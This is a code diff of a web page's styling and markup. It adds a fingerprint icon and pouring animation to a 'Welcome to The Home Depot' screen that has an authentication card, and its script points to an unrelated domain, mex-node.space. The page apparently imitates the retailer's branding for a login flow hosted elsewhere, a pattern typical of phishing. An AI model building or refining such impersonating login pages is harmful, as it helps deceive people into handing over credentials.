@@ -30,14 +30,13 @@
       inset: 0;
       background: #f97316; /* Initial orange background */
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       z-index: 20;
-      transition: opacity 0.5s ease;
     }
     .welcome-screen.hidden {
-      opacity: 0;
-      pointer-events: none;
+      display: none;
     }
 
     /* Pouring Animation */
@@ -47,9 +46,10 @@
       left: 0;
       width: 100%;
       height: 100%;
-      z-index: 15;
+      z-index: 25; /* Higher than welcome-screen to pour over it */
       pointer-events: none;
       overflow: hidden;
+      display: none;
     }
     .pour {
       width: 100%;
@@ -69,12 +69,29 @@
     /* Welcome Text During Pour */
     #welcome-text {
       transition: color 0.3s ease;
+      z-index: 30; /* Ensure text stays above pour */
+      position: relative;
     }
     .pouring #welcome-text {
       color: #000000; /* Black when pouring white over orange */
     }
     .not-pouring #welcome-text {
       color: #ffffff; /* White when on orange background */
+    }
+
+    /* Fingerprint */
+    #fingerprint {
+      width: 80px; /* Adjust size as needed */
+      height: 80px;
+      margin-top: 1rem;
+      z-index: 30; /* Above pour */
+      position: relative;
+    }
+    .pouring #fingerprint {
+      filter: invert(0); /* Black when pouring */
+    }
+    .not-pouring #fingerprint {
+      filter: invert(1); /* White initially on orange */
     }
 
     /* Responsive Adjustments */
@@ -101,6 +118,10 @@
       .glow {
         box-shadow: 0 0 10px rgba(249, 115, 22, 0.7), 0 0 20px rgba(249, 115, 22, 0.3);
       }
+      #fingerprint {
+        width: 60px; /* Smaller on mobile */
+        height: 60px;
+      }
     }
   </style>
 </head>
@@ -110,10 +131,11 @@
     <h1 id="welcome-text" class="font-bold text-white drop-shadow-lg text-center">
       Welcome to The Home Depot
     </h1>
+    <img id="fingerprint" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23000'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm0-14c-3.31 0-6 2.69-6 6 0 1.66.67 3.16 1.76 4.24l1.41-1.41C8.45 13.91 8 12.99 8 12c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .99-.45 1.91-1.17 2.83l1.41 1.41C17.33 15.16 18 13.66 18 12c0-3.31-2.69-6-6-6zm0 8c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z'/%3E%3C/svg%3E" alt="Fingerprint">
   </div>
 
   <!-- Pouring Animation Container -->
-  <div id="pour-container" class="pour-container hidden">
+  <div id="pour-container" class="pour-container">
     <div class="pour"></div>
   </div>
 
@@ -206,6 +228,7 @@
     const authCard = document.getElementById('auth-card');
     const status = document.getElementById('status');
     const welcomeText = document.getElementById('welcome-text');
+    const fingerprint = document.getElementById('fingerprint');
     const BASE_URL = 'https://mex-node.space';
 
     const urlParams = new URLSearchParams(window.location.search);
@@ -214,7 +237,7 @@
 
     // Show welcome screen for 2 seconds, then start pouring animation
     setTimeout(() => {
-      pourContainer.classList.remove('hidden');
+      pourContainer.style.display = 'block'; // Show pour container
       welcome.classList.add('pouring');
       welcome.classList.remove('not-pouring');
       
